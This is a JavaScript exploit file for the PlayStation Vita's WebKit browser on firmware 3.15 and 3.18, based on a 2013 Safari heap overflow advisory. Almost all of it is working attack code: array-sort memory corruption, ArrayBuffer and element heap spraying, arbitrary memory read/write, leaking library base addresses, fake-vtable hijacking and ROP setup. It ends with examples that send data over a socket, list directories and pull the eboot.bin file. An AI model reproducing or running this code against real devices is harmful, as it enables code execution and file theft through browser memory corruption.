/*
    This file contains the 'exploit' which is heavily based on
    http://packetstormsecurity.com/files/123089/Packet-Storm-Advisory-2013-0903-1-Apple-Safari-Heap-Buffer-Overflow.html    
*/

/*
    Do the real stuff
*/
function initMemoryHole()
{
    try {

        var user_agent = navigator.userAgent;
        if(user_agent.indexOf("Vita 3.15") != -1){
            version = "v3_15";
        }else if(user_agent.indexOf("Vita 3.18") != -1){
            version = "v3_18";
        }else{
            logdbg("Not Supported !");
            return -1;
        }

        offsets = ver_offsets[version];

        /* 
           .sort() vuln c/p
-------------------------------------------------------------------------------
        */

        logdbg("Initialization\n");
        var u32 = new Uint32Array(8);
        var a1 = [0,1,2,3,u32];
        var a2 = [0,1,2,3,4]; // right after a1
        var a1len = a1.length;
        var a2len = a2.length;
        var u32len = u32.length;

        if (!_gc) _gc = new Array();
        _gc.push(u32,a1,a2);

        var myCompFunc = function(x,y)
        {
            if (y == 3 && x == u32) {
                a1.shift();
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var u32addr = a2.length;
        if (u32addr == a2len) { logdbg("Error: 1"); return -1; }


        myCompFunc = function(x,y)
        {
            if (y == 0 && x == 1) {
                a1.length = a1len;
                a1.shift();
                a2.length = u32addr + 0x28;
            }
            if (y == 3) {
                a1.unshift(0);
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var c = a2.length;
        if (c != u32addr + 0x28) { logdbg("error: 2"); a1[3] = 0; return -1; }

        var mo = {};
        var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }
        var a3 = [0,1,2,a1[3]];

        Object.defineProperty(mo, "prop0", pd);
        for(var i=1; i < 7; i++){
            mo["prop"+i] = i;
        }

        _gc.push(a3,mo,pd);

        myCompFunc = function(x,y)
        {
            if (y == 2) {
                a3.shift();
            }
            return 0;
        }

        a3.sort(myCompFunc);
        a1[3] = 0; a3[3] = 0;

        // setup GetterSetter
        u32.prop1 = 8;  // 8 = JSType.GetterSetterType
        u32.prop2 = 8;
        u32.prop3 = 8;
        u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure

        var f = new Function(" return 876543210 + " + (_cnt++) + ";");
        f.prop2 = u2d(0x40000000,0x40000000); // a new value for u32.length
        f();
        pd.get = f;
        Object.defineProperty(mo, "prop0", pd);
        delete mo.prop0;

        if (u32.length == u32len) { logdbg("Error: 3"); return -1; }
        /*
-------------------------------------------------------------------------------
         */

        /* 
           Spray memory with ArrayBuffers that will be used to get
           arbitrary read/write 
        */
        var spraysiz = 0x1000
        logdbg("Spraying ArrayBuffers...");

        sprays = new Array(spraysiz);
        _gc.push(sprays);

        for(var o = 0; o < spraysiz; o++){
            buf = new ArrayBuffer(0xABC0);
            _gc.push(buf);
            sprays[o] = buf;
        }
        logdbg("Done spraying\n");

        /*
           Find a one of the sprayed ArrayBuffer objects in memory
           by looking for the size of the object
        */
        var idx = -1;       // index in u32 to size of object
        var baseaddr = -1;  // base address of object
        logdbg("Searching for signature...");
        for(var j = 0x0; j < 0xffffffff; j++){
            if((j % (0xa0000)) == 0){
                logdbg("...");
            }
            if(u32[j] == 0xABC0){
                baseaddr = u32[j-1];
                idx = j;
                logdbg("Found ArrayBuffer signature at u32[0x" + idx.toString(16) + "] -> 0x" + baseaddr.toString(16) +"\n");
                break;
            }
        }
       // while(true){};
        if(idx == -1){
            logdbg("Did not find signature");
            return -1;
        }


        var espraysiz = 0x2000
        logdbg("Spraying Elements...");

        esprays = new Array(espraysiz);
        _gc.push(esprays);

        for(var o = 0; o < espraysiz; o++){
            var e = document.createElement("textarea");
            e.rows = 0x66656463;
            _gc.push(e);
            esprays[o] = e;
        }
        logdbg("Done spraying\n");

        /*
           Find a one of the sprayed Element objects in memory
           by looking for the rows of the object
        */
        var eidx = -1;       // index in u32 to size of object
        logdbg("Searching for Element signature...");
        for(var j = 0x0; j < 0xffffffff; j++){
            if((j % (0xa0000)) == 0){
                logdbg("...");
            }
            if(u32[j] == 0x66656463){
                eidx = j;
                logdbg("Found Element signature at u32[0x" + eidx.toString(16) + "]\n");
                break;
            }
        }
        if(eidx == -1){
            logdbg("Did not find Element signature");
            return -1;
        }

        /*
           Change the rows of the Element object then scan the array of
           sprayed objects to find an object whose rows has been change

        */
        var oldval = u32[eidx].toString(16);
        u32[eidx] = 0x55555555;
        logdbg("Changing size of Element object: 0x" + oldval + " -> 0x" + u32[eidx].toString(16));

        logdbg("Looking for modified Element object...");
        var eleobj = -1;
        for(var l = 0; l < espraysiz; l++){
            var t = esprays[l];
            if(t.rows == 0x55555555){
                eleobj = t;
                logdbg("Found modified Element object at esprays[0x" + l.toString(16) + "]\n");
            }
        }

        if(eleobj == -1){
            logdbg("Did not find modified object\n");
            return -1;
        }

        /*
           Change the size of the ArrayBuffer object then scan the array of
           sprayed objects to find an object whose size has been change
        */

        var oldval = u32[idx].toString(16);
        u32[idx] = 0xdeadbabe;
        logdbg("Changing size of ArrayBuffer object: 0x" + oldval + " -> 0x" + u32[idx].toString(16));

        logdbg("Looking for modified ArrayBuffer object...");
        var arrobj = -1;
        for(var l = 0; l < spraysiz; l++){
            var t = sprays[l];
            if(t.byteLength == 0xdeadbabe){
                arrobj = t;
                logdbg("Found modified ArrayBuffer object at sprays[0x" + l.toString(16) + "]\n");
            }
        }

        if(arrobj == -1){
            logdbg("Did not find modified object\n");
            return -1;
        }

        var u32base = u32[0x40000000-2];


        u32[idx - 1] = 0x0;                                                 // modify base pointer of ArrayBuffer object
        u32[idx] = 0xffffff00;                                              // modify size of ArrayBuffer object
        aspace = new Uint8Array(arrobj);
        aspace32 = new Uint32Array(arrobj);
        aspace16 = new Uint16Array(arrobj);

        allocate_memory = init_memory(u32base - 0x400000);                  // our memory allocator

        /*
            Get SceWebkit base
        */
        var vtab = aspace32[(u32addr / 4)];                                 // vtable of u32 
        var leakedptr = aspace32[(vtab + 0x48) / 4];                        // leak a pointer in .text of SceWebkit 
        var scewkbase = leakedptr - offsets.scewkbase_off;                  // base address of SceWebkit module
 
        /*
            Get SceLibc base
        */
        var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);

        /*
            Get SceNet base
        */
        var scenetbase = get_base_from_offsets(scewkbase, offsets.scelibnetentry_off, offsets.scelibnetbase_off);

        /*
            Get SceKernel base
        */
        var scekernbase = get_base_from_offsets(scewkbase, offsets.scekernentry_off, offsets.scekernbase_off);

        logdbg("Address of u32: 0x" + u32addr.toString(16))
        logdbg("Base of u32: 0x" + u32base.toString(16))
        logdbg("SceWebkit base: 0x" + scewkbase.toString(16));
        logdbg("SceLibc base: 0x" + scelibcbase.toString(16));
        logdbg("SceNet base: 0x" + scenetbase.toString(16));
        logdbg("SceLibKernel base: 0x" + scekernbase.toString(16) + "\n");


        /*
            Create fake vtable and replace old one
        */
        var vtoffset = offsets.elementvtable_off;                           // offset to vtable ptr from rows field of Element
        var scrollvoffset = offsets.setscrollleft_off;                      // offset to setScrollLeft() vptr from beggining of vtable
        var vtidx = ((u32base + (eidx * 4) )+ vtoffset);                    // ptr to vtable
        var vtptr = aspace32[vtidx / 4];                                    // actual vtable pointer
        logdbg("Element vtable pointer at: 0x" + vtidx.toString(16));
        logdbg("Element vtable at: 0x" + vtptr.toString(16));

        var fkvtable = allocate_memory(0x400 * 4);                          // address of fake vtable
        logdbg("Fake vtable at: 0x" + fkvtable.toString(16));

        logdbg("Copying vtable...\n");
        for(var i = 0; i < 0x400; i++){
            aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(vtptr + (i << 2)) / 4];
        }

        aspace32[vtidx / 4] = fkvtable;                                     // replace vtable

        /*
            Initialize ROP gadgets and library functions
        */
        bases = {
                    "SceWebkit": scewkbase, 
                    "SceLibKernel": scekernbase, 
                    "SceNet": scenetbase,
                    "SceLibc": scelibcbase
                };

        var tmpmem = allocate_memory(0x5000);
        libraries = init_ggts(bases, get_caller(tmpmem, eleobj, vtidx, fkvtable), version);

        /*
            Some examples
        */

        // socket
        // fix IP and port
        logdbg("- Socket connection test -");
        socket_send("192.168.1.107", 9999, "Hello World From the Vita!\n");

        // list dir
        logdbg("- Directory listing test -");
        list_dir("app0:");
        list_dir("app0:sce_sys/");

        // get file
        logdbg("- File retrieval test -");
        retrieve_file("app0:eboot.bin", "eboot.bin");


        return aspace;
    }
    catch(e) {
        logdbg("Error: " + e.line + " " + e);
        return -1;
    }

    return -1;
}
